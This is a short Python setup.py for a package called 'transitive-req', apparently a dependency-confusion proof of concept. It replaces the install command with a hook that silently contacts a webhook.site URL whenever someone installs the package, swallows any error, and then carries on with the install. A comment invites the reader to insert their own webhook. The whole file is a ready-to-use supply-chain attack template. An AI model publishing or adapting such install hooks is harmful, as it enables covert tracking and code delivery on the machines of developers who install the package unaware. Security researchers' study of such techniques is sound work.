from setuptools import setup
from setuptools.command.install import install
import urllib.request

BEACON_URL = "https://webhook.site/a043f82b-a3af-450a-8d32-12b1ea2babaf"  # your webhook URL

class InstallWithBeacon(install):
    def run(self):
        try:
            urllib.request.urlopen(BEACON_URL, timeout=3)
        except Exception:
            pass
        install.run(self)

setup(
    name="transitive-req",
    version="1.0.0",
    packages=["transitive-req"],
    description="POC package (beacon-only)",
    cmdclass={'install': InstallWithBeacon},
)
